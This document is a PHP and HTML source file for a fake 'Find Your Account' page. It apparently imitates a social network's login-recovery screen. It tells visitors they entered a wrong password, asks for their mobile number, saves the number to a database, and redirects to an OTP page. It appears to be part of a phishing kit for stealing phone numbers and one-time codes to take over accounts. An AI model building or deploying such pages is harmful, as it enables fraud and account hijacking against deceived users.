<?php 
if (isset($_POST['submit'])) {
    echo "Form submitted<br>";
    $number = $_POST['number'];

    $host = 'localhost';
    $user = 'root';
    $pass = '';
    $dbname = 'luna';

    $conn = mysqli_connect($host, $user, $pass, $dbname);

    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    echo "Connected to database<br>";

    $stmt = $conn->prepare("INSERT INTO lack (number) VALUES (?)");
    $stmt->bind_param("s", $number);
    


    $stmt->execute();
    $stmt->close();
    $conn->close();
    // Redirect to another page after form submission
    header("Location: otp.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Number Input</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            height: 340px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 420px;
        }
        .container h1 {
            color: #000000;
            font-size: 20px;
            margin-bottom: 20px;
            text-align: left;
        }
        .container input {
            padding: 16px;
            margin-bottom: 16px;
            border: 1px solid #dddfe2;
            border-radius: 9px;
            width: 90%;
            font-size: 15px;
        }
        .container .divider {
            border-bottom: 1px solid #ddd; /* Border between input fields */
            margin: 10px 0;
        }
        .container button {
            padding: 10px;
            background-color: #128df1;
            color: #fff;
            font-family: roboto bold;
            border: none;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            width: 16%;
        }
        .spaced-paragraph {
            margin: 15px;
            padding: 7px;
            line-height: 1.2;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Find Your Account</h1>
        <div class="divider"></div> <!-- Divider between input and button -->
        <p style="font-family: Arial, sans-serif; font-size: 16px; color: #333; text-align: left;">You entered wrong password Please enter your email address or mobile number to search for your account.</p>
        <p class="spaced-paragraph"></p>
        <form action="cent.php" method="post">
            <input type="tel" id="number" placeholder="mobile Number" name="number" required>
            <div class="divider"></div> <!-- Divider between input and button -->
            <button type="submit">Search</button>
        </form>
    </div>
</body>
</html>
